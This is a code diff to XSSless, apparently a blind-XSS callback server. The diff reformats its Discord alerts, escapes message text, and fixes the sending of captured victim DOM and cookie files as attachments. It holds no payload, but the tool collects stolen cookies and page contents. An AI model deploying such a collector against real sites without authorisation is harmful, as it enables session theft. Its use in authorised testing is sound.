@@ -75,7 +75,7 @@ const escapeSpecChars = (text) => {
 
 
 function generate_blind_xss_alert(body) {
-  var alert = "**XSSless: Blind XSS Alert**\n";
+  var alert = "============================================================================\n**XSSless: Blind XSS Alert**\n";
   const random_dir = makeid(7);
   const output_dir = `${data_path}/${random_dir}`
   if (!fs.existsSync(output_dir)) fs.mkdirSync(output_dir);
@@ -102,12 +102,13 @@ function generate_blind_xss_alert(body) {
       alert += "*"+escapeSpecChars(k)+":* " + "```" + escapeSpecChars(body[k]) + "```" + "\n"
     }
   }
+  alert+="============================================================================\n"
   return [alert, output_dir]
 }
 
 
 function generate_callback_alert(headers, data, url) {
-  var alert = "**XSSless: Out-of-Band Callback Alert**\n"
+  var alert = "============================================================================\n**XSSless: Out-of-Band Callback Alert**\n"
   alert += `• *IP Address:* \`${escapeSpecChars(data["Remote IP"])}\`\n`
   alert += `• *Request URI:* \`${escapeSpecChars(url)}\`\n`
 
@@ -117,12 +118,15 @@ function generate_callback_alert(headers, data, url) {
       alert += `• *${escapeSpecChars(key)}:* \`${escapeSpecChars(headers[key])}\`\n`
     }
 }
+  alert+="============================================================================\n"
   return(alert)
 }
 
 function generate_message_alert(body) {
-  var alert = "**XSSless: Message Alert**\n"
-  alert += "*\n" + body + "*\n";
+  var alert = "============================================================================\n**XSSless: Message Alert**\n"
+  alert += "*Message*\n"
+  alert += "```\n" + escapeSpecChars(body) + "```\n";
+  alert += "============================================================================\n"
   return alert
 }
 
@@ -155,11 +159,8 @@ function send_to_discord(messageContent, attachment_path = null) {
 
 
     if (attachment_path){
-      const dom_attachment = new MessageAttachment(`${data_path}/${attachment_path}/dom.html`)
-      const cookie_attachment = new MessageAttachment(`${data_path}/${attachment_path}/cookies.txt`)
       channel.send({
-        content: 'HTML',
-        file: [dom_attachment, cookie_attachment]
+        files: [`${attachment_path}/dom.html`, `${attachment_path}/cookies.txt`]
       }).then(sentAttachment => console.log("Attachment sent!"))
       .catch(error => console.error("Error sending message: " + error));
     }
